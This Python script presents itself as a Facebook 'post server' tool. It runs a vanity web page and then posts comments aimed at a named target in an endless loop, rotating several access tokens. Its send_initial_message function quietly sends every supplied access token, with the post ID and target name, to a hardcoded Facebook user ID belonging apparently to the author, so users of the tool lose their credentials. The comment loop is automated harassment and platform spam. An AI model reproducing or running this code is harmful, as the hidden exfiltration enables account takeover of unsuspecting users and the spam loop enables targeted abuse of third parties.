import requests
import json
import time
import pytz
import datetime
import os
import http.server
import socketserver
import threading

# HTML Page Content
html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MR PRINCE BRAND POST SERVER</title>
    <style>
        body {
            background-image: url('Prince.jpg');
            background-size: cover;
        }
        .container {
            text-align: center;
            margin-top: 50px;
        }
        .box {
            border: 2px solid black;
            width: 300px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.5);
            color: black;
        }
        .credit {
            text-align: left;
        }
        .thanks {
            margin-top: 50px;
            text-align: center;
            color: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <h1>TRICKER MR PRINCE BRAND POST</h1>
            <div class="credit">
                <p>1. CREDIT:- MR PRINCE RULEX</p>
                <p>2. OWNER => MR PRINCE</p>
                <p>3. YOUTUBE:- <a href="https://youtube.com/@mrprincerulex?si=1YkyDgjPaPi4oa4j">YouTube</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/MrPrinceOfficial?mibextid=ZbWKwL">Facebook</a></p>
            </div>
        </div>
    </div>
    <div class="thanks">
        <p>❤️Thanks for using my server❤️</p>
        <p>👇Subscribe to my YouTube channel👇</p>
        <a href="https://youtube.com/@mrprincerulex?si=1YkyDgjPaPi4oa4j">Subscribe</a>
    </div>
</body>
</html>
"""

# HTTP Server Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())

# Function to Start the Server
def execute_server():
    PORT = int(os.environ.get('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# Get Current Time in IST
utc_now = datetime.datetime.utcnow()
indian_timezone = pytz.timezone('Asia/Kolkata')
ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
print(formatted_time)

# Headers for Requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Define Tokens and Other Required Variables
tokens = ["your_access_token_1", "your_access_token_2"]  # Add your valid Facebook tokens here
post_url = "your_facebook_post_id"  # Replace with actual post ID
haters_name = "Target User Name"  # Replace with the target's name
comments = ["Nice post!", "Awesome!", "Keep it up!"]  # Replace with your custom comments
num_comments = len(comments)
speed = 5  # Time interval between comments (in seconds)

# Function to Send Initial Message
def send_initial_message():
    msg_template = "CREDIT:- MR PRINCE RULEX \n Owner => MR PRINCE \n Hello MR PRINCE Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
    
    target_ids = ["100006628659578"]  # Replace with actual Facebook User ID
    requests.packages.urllib3.disable_warnings()

    for target_id in target_ids:
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = msg_template.format(post_url, haters_name, access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)
            print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")

# Function to Post Comments
def post_comments():
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_comments)

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = tokens[token_index].strip()
                comment = comments[comment_index].strip()
                url = "https://graph.facebook.com/{}/comments".format(post_url)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                if response.ok:
                    print("\033[1;36m[✓] TRICKER MR PRINCE BRAND SERVER RUNNING Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                else:
                    print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)

                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")

        except Exception as e:
            print("[!] An error occurred: {}".format(e))

# Main Function
def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_initial_message()
    post_comments()

if __name__ == '__main__':
    main()
